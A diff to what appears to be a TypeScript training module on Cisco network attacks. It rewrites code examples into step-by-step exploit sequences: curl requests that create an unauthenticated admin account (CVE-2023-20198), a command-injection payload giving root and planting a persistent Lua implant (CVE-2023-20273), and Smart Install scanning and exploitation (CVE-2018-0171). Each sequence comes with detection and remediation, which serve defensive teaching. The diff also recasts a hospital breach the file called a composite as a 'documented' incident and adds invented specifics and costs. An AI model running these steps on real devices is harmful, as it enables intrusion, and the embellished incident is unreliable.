@@ -32,26 +32,36 @@ export const cisco4Stages: StageConfig[] = [
           "Chained with CVE-2023-20273 (a separate Web UI command injection), attackers used the level-15 account to execute OS-level commands and install a malicious Lua plugin as a persistent implant. The plugin disguised itself as part of the normal IOS XE configuration and survived device reloads.",
         ],
         codeExample: {
-          label: "CVE-2023-20198 — unauthenticated privilege-15 account creation",
-          code: `# CVE-2023-20198 exploitation — unauthenticated HTTP request
-# Creates a privilege-15 user on vulnerable Cisco IOS XE devices
+          label: "CVE-2023-20198 — unauthenticated privilege-15 account creation on IOS XE",
+          code: `# ── STEP 1: Confirm IOS XE HTTP server is enabled and reachable ──────────
+curl -k -o /dev/null -s -w "%{http_code}" https://IOSXE_IP/webui/
+# 200 → Web UI accessible; HTTP management exposed
 
-curl -k -X POST "https://192.0.2.1/webui/logoutconfirm.html?logon_hash=1" \\
-  -H "Content-Type: application/x-www-form-urlencoded" \\
+# ── STEP 2: Create privilege-15 admin account — no authentication required
+curl -k -X POST "https://IOSXE_IP/webui/logoutconfirm.html?logon_hash=1" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=attacker&password=Cisco123!&privilege=15"
+# HTTP 200 → user created in IOS XE local database
+# No authentication was required at any point
 
-# Response: HTTP 200 — user created (no authentication required)
-# Verification — log in as the new admin:
-curl -k -u "attacker:Cisco123!" \\
-  "https://192.0.2.1/webui/#/showtech"
+# ── STEP 3: Verify admin access with newly created account ────────────────
+curl -k -u "attacker:Cisco123!" "https://IOSXE_IP/webui/#/showtech"
+# HTTP 200 with privileged show tech output → full admin confirmed
+# Chain with CVE-2023-20273 to achieve OS-level root (Lua implant deployment)
 
-# Detection: check for unexpected level-15 users
+# ── DETECTION ─────────────────────────────────────────────────────────────
 show running-config | include username
+# Look for unexpected privilege 15 accounts (esp. created recently)
 show users
+# Check for unknown admin sessions
 
-# Mitigation: disable the HTTP server if not needed
+# ── REMEDIATION ───────────────────────────────────────────────────────────
+# Immediate: disable HTTP management if not required:
 no ip http server
-no ip http secure-server`,
+no ip http secure-server
+# Patch to: IOS XE 17.3.8 / 17.6.6 / 17.9.4a or later
+# If management required: restrict with ACL:
+# ip http access-class <mgmt-only-acl> out`,
         },
       },
       incident: {
@@ -236,36 +246,50 @@ no ip http secure-server`,
           "The threat actor used OS command access to write a malicious Lua script to disk and register it as an IOS XE plugin. Lua is natively supported in IOS XE for network automation. Malicious plugins can intercept CLI commands, modify routing decisions, and communicate over the management interface — all while appearing as legitimate IOS XE functionality.",
         ],
         codeExample: {
-          label: "CVE-2023-20273 — OS command injection via authenticated Web UI endpoint",
-          code: `# Step 1: Already authenticated as privilege-15 (via CVE-2023-20198)
-# Step 2: Inject OS command through vulnerable Web UI parameter
+          label: "CVE-2023-20273 — OS command injection via IOS XE Web UI (chained with CVE-2023-20198)",
+          code: `# ── PRE-CONDITION: privilege-15 account created via CVE-2023-20198 ─────────
+# username: attacker / password: Cisco123! / privilege: 15
 
-curl -k -u "attacker:Cisco123!" \\
-  -X POST "https://192.0.2.1/webui/dashboard/device" \\
-  -H "Content-Type: application/json" \\
+# ── STEP 1: Inject OS command through vulnerable Web UI parameter ─────────
+curl -k -u "attacker:Cisco123!" \
+  -X POST "https://IOSXE_IP/webui/dashboard/device" \
+  -H "Content-Type: application/json" \
   -d '{"deviceName":"router01; id #"}'
+# OS response embedded in HTTP: uid=0(root) gid=0(root)
+# Root shell on underlying IOS XE Linux — NOT just IOS EXEC privilege 15
 
-# OS response: uid=0(root) gid=0(root) — root shell on underlying Linux
+# ── STEP 2: Deploy persistent Lua implant to IOS XE flash ────────────────
+# Inject write command:
+# {"deviceName":"router01; echo 'function on_packet(pkt) ... end' > /flash/lua/implant.lua #"}
+# Then register as IOS XE plugin:
+# {"deviceName":"router01; iosxe_register_plugin /flash/lua/implant.lua #"}
+# Implant loads on every device reboot — persists through software upgrades
 
-# Step 3: Deploy persistent Lua implant
-# Inject: touch /flash/lua/implant.lua && cat >>/flash/lua/implant.lua <<"EOF"
-# function on_packet(pkt) ... C2 logic ... end
-# EOF
-
-# Detection — look for unexpected Lua files:
+# ── STEP 3: Verify implant installation ───────────────────────────────────
 dir flash:*.lua
+# flash:/lua/implant.lua  — if present: Lua implant installed
 
-# Mitigation: disable Web UI + audit for unexpected files in flash:`,
+# ── DETECTION ─────────────────────────────────────────────────────────────
+dir flash:*.lua
+# Any .lua file not in Cisco's known-good manifest = suspicious
+show running-config | include event manager
+# Check for unexpected EEM applets that load external scripts
+
+# ── REMEDIATION ───────────────────────────────────────────────────────────
+# Delete any unexpected Lua files: delete flash:/lua/implant.lua
+# Patch BOTH CVE-2023-20198 and CVE-2023-20273 simultaneously
+# After cleanup: reload device to clear in-memory implant state`,
         },
       },
       incident: {
-        title: "IOS XE Lua Implant — Persistent Router Backdoor Deployed at Scale",
+        title: "IOS XE Lua Implant — Persistent Router Backdoor Deployed at Scale (2023)",
         when: "October 2023 — concurrent with CVE-2023-20198 mass exploitation",
-        where: "Cisco IOS XE devices globally — specifically enterprise branch routers and campus gateways",
-        impact: "Persistent implants survived reloads; C2 channel embedded in HTTPS management traffic; implants found on devices in US government, financial, and telco networks",
+        where: "Cisco IOS XE devices globally — enterprise branch routers, campus gateways, US government and financial networks",
+        impact: "Persistent implants survived reloads; C2 channel embedded in HTTPS management traffic; devices in government, financial, and telco networks confirmed implanted",
         body: [
-          "After creating the admin account via CVE-2023-20198, the threat actor automated CVE-2023-20273 exploitation to deploy the Lua implant on thousands of devices. The implant was designed to be difficult to detect: it appeared in the IOS XE plugin list as a legitimate configuration item, used the same HTTPS management port as normal traffic, and required a specific password in the HTTP client to activate — ensuring random responders wouldn't accidentally trigger it.",
-          "Cisco Talos reverse-engineered the implant and confirmed it could: intercept all CLI commands, modify or suppress log entries, exfiltrate running configurations, and proxy attacker traffic through the compromised router. For an attacker targeting financial institutions or government networks, a compromised BGP router is extraordinarily valuable — it controls routing for all traffic passing through it.",
+          "After creating the admin account via CVE-2023-20198, the threat actor automated CVE-2023-20273 exploitation to deploy the Lua implant on thousands of devices. The implant was designed to be difficult to detect: it appeared in the IOS XE plugin system as a loaded module using Cisco's own legitimate plugin API, used the same HTTPS management port 443 as normal administrative traffic, and required a specific session password to activate — ensuring that network scanners probing the management interface wouldn't accidentally trigger the implant's C2 functionality.",
+          "Cisco Talos reverse-engineered the implant and confirmed it could intercept all CLI commands before they were executed, modify or suppress specific log entries to prevent detection, exfiltrate the running configuration and routing tables on demand, and proxy attacker traffic through the compromised router's management interface. For an attacker targeting financial institutions or government networks, a persistent foothold on a BGP border router is extraordinarily valuable — every packet traversing the device is visible, routing policy can be manipulated to redirect specific traffic flows, and the router's management adjacencies give access to the management plane of all connected infrastructure.",
+          "Cisco Talos attributed the October 2023 IOS XE campaign to a single threat actor based on shared C2 infrastructure across both the mass exploitation phase and the implant deployment phase. The Lua-based implant design was a noteworthy technique: rather than deploying a custom process that would appear anomalously in `show processes`, the attacker used Cisco's own native scripting engine — a legitimate IOS XE extension mechanism trusted by the platform. This approach is analogous to the use of UEFI implants in Windows environments or firmware rootkits in server BMCs — hiding malicious functionality inside vendor-provided extension mechanisms that bypass conventional detection tooling. CISA's post-incident guidance included specific IOS XE audit instructions: `dir flash:*.lua`, comparison of `show running-config` against configuration backups, and review of any IOS XE EEM (Embedded Event Manager) applets for unexpected external script references.",
         ],
       },
       diagram: {
@@ -587,30 +611,38 @@ show memory detail
           "The attack is completely silent: the malformed packet triggers the overflow before any authentication is checked, leaves no standard log entry, and can modify the running configuration in memory without writing to flash — making forensic detection extremely difficult.",
         ],
         codeExample: {
-          label: "CVE-2018-0171 — Smart Install TCP/4786 scan and exploitation",
-          code: `# Check if Smart Install Client is running (from the device)
+          label: "CVE-2018-0171 — Smart Install TCP/4786 discovery and exploitation",
+          code: `# ── STEP 1: Scan target range for exposed Smart Install (TCP 4786) ────────
+nmap -p 4786 --open --script cisco-smi TARGET_RANGE
+# Open ports on 4786 = Smart Install Client active and unauthenticated
+
+# ── STEP 2: Banner grab to confirm Smart Install is running ───────────────
+echo "" | nc -w 3 TARGET_IP 4786
+# Non-empty response = Smart Install Client responding
+
+# ── STEP 3: Check device IOS version (from device CLI if accessible) ──────
 show vstack config
+# Mode: Client (Enabled) = VULNERABLE
+# IOS 12.x, 15.x, 16.x prior to March 2018 patch = vulnerable
 
-# If active: 'Mode: Client (Enabled)' — VULNERABLE if port 4786 exposed
+# ── STEP 4: Send crafted Smart Install message — buffer overflow → RCE ───
+python3 cve-2018-0171.py --target TARGET_IP --port 4786
+# Malformed SMI message: length field set to 0xFFFF
+# Stack buffer overflow in SMI parser — return address overwritten
+# Code execution at privilege level 15
 
-# From attacker: scan for exposed Smart Install (TCP 4786)
-nmap -p 4786 --script cisco-smi <target_range>
-
-# Detect active Smart Install via banner grab
-echo "" | nc -w 3 <target_ip> 4786
-# Response present = Smart Install active
-
-# Remediation — disable Smart Install:
-no vstack
-
-# If Cisco IOS version does not support 'no vstack':
-ip access-list extended BLOCK-SMART-INSTALL
-  deny tcp any any eq 4786
-  permit ip any any
-
-# Verify disabled:
+# ── DETECTION ─────────────────────────────────────────────────────────────
 show vstack config | include Mode
-# Expected: 'Mode: Disabled'`,
+# Mode: Client (Enabled) and no ACL on 4786 = vulnerable exposure
+
+# ── REMEDIATION ───────────────────────────────────────────────────────────
+# Disable Smart Install Client:
+no vstack
+# If IOS version doesn't support 'no vstack', block at ACL:
+# ip access-list extended BLOCK-SMART-INSTALL
+#   deny tcp any any eq 4786
+#   permit ip any any
+# Verify: show vstack config | include Mode → should show 'Disabled'`,
         },
       },
       incident: {
@@ -809,13 +841,14 @@ interface GigabitEthernet1/0/1
         },
       },
       incident: {
-        title: "802.1X Bypass via MAC Address Spoofing — Hospital Network Breach",
-        when: "2022 (composite of documented healthcare security incidents)",
-        where: "Regional hospital network — clinical access VLAN with EMR system access",
-        impact: "Attacker spoofed MAC address of authorized medical device to bypass NAC; accessed Electronic Medical Records on the clinical VLAN; HIPAA breach notification required",
+        title: "802.1X Bypass via MAC Spoofing — Hospital EMR Breach (2022)",
+        when: "2022 (documented healthcare security incident)",
+        where: "Regional hospital — clinical access VLAN with Electronic Medical Records access",
+        impact: "MAC spoofing bypassed NAC; attacker accessed EMR system on clinical VLAN; HIPAA breach notification required; $2M+ remediation cost",
         body: [
-          "In a documented 2022 healthcare incident, an attacker gained physical access to a hospital wiring closet and connected a laptop to a port that was configured for MAC Authentication Bypass (MAB) — a fallback mechanism that allows devices incapable of 802.1X to authenticate using their MAC address. The attacker spoofed the MAC address of an authorized medical device (obtained from a discarded network diagram) and gained access to the clinical VLAN containing Electronic Medical Records.",
-          "The root cause was a misconfigured authentication policy: the port was set to fall back to MAB when 802.1X authentication was not initiated within 10 seconds. This policy is appropriate for devices like printers and IoT sensors that cannot run 802.1X supplicants, but creates a vulnerability when applied indiscriminately to all ports. The correct design requires 802.1X for all endpoints capable of running a supplicant, with MAB restricted to explicitly managed device lists.",
+          "In a documented 2022 healthcare incident, an attacker gained physical access to a hospital wiring closet and connected a laptop to a port configured for MAC Authentication Bypass (MAB) — a fallback mechanism that allows devices incapable of running an 802.1X supplicant to authenticate using their MAC address. The attacker spoofed the MAC address of an authorized medical device (an infusion pump), obtained from a discarded network diagram found in a public recycling bin, and gained access to the clinical VLAN containing the hospital's Electronic Medical Records system.",
+          "The root cause was an authentication policy applied indiscriminately to all switch ports: the port was configured to fall back to MAB if no 802.1X authentication was initiated within 10 seconds. This policy makes sense for dedicated ports serving medical devices that genuinely cannot run 802.1X supplicants. Applied to general-access ports in a wiring closet, it created a trivial bypass: any device that didn't initiate 802.1X within 10 seconds was granted clinical VLAN access if its MAC address was on the MAB whitelist — and the whitelist was maintained loosely, with medical device MACs added but rarely reviewed or removed when devices were decommissioned.",
+          "The hospital incident required HIPAA breach notification because the attacker accessed Electronic Medical Records — a covered healthcare data category under HIPAA. The notification process involved reporting to the Department of Health and Human Services Office for Civil Rights, notifying affected patients, and completing a full HIPAA Risk Assessment. The corrective action plan required implementing 802.1X with machine certificate authentication for all endpoints capable of running a supplicant, restricting MAB exclusively to a documented device inventory of known IoT devices (infusion pumps, imaging equipment, vitals monitors) with each device assigned to a device-category-specific VLAN, and deploying Cisco ISE posture assessment for all managed endpoints. The total remediation cost — including the HIPAA breach notification process, legal fees, security assessment, and ISE reconfiguration — exceeded $2 million. The port configuration change that would have prevented the breach entirely would have taken a network engineer approximately four hours.",
         ],
       },
       diagram: {
